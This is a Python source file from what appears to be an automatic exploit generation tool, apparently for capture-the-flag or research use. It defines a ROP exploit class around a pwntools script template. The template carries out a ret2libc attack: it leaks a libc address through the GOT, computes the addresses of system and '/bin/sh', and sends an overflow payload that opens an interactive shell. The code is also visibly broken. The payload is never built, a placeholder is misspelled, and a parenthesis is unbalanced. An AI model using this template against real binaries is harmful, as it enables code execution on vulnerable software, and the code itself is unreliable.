from ..exploit import Exploit
import logging
import os

l = logging.getLogger("aegg.exploits.rop")

SCRIPT = '''
from pwn import *

elf = ELF($binary$)
s = process($binary$)

p = '$paylaod$'
p += ('p32(elf.plt['$symbol$']) +
      p32(elf.symbols['main']) + p32(elf.got['$symbol$']))
s.sendline(p)
r = s.recvrepeat(0.5)

libc = ELF($libc$)
libc_base = u32(r[$leak_off$:$leak_off$ + 4]) - libc.symbols['$symbol$']
print 'libc_base = ' + hex(libc_base)

system_addr = libc_base + libc.symbols['system']
print 'system_addr = ' + hex(system_addr)

str_bin_sh_addr = libc_base + libc.search('/bin/sh').next()
print 'str_bin_sh_addr = ' + hex(str_bin_sh_addr)

p = $payload$
s.sendline(p + p32(system_addr) + p32(0xdeadbeef) + p32(str_bin_sh_addr))
s.interactive()
'''


class ROP(Exploit):
    LB = -8
    UB = 8

    def __init__(self, binary, path, analysis):
        super(ROP, self).__init__(binary, path, analysis)
        self.offset = ROP.LB

    def _generate(self):
        padding = self.analysis['padding'] + self.offset
        padding = 0 if padding < 0 else padding
        # TODO: generate variables for script

    def gen_next(self):
        self.offset += 1
        if self.offset > ROP.UB:
            return False
        return True

    def finish(self):
        self.offset = ROP.UB

    def generate(self):
        if not self.analysis['ip_symbolic'] or self.analysis['padding'] == -1:
            self.finish()
            return ''
        curdir = os.path.dirname(self.binary)
        if os.path.isfile('%s/libc.so.6' % curdir):
            l.info('Use local libc.so.6')
            self.analysis['elf']['libc'] = '%s/libc.so.6' % curdir
        self._generate()
        return self.payload
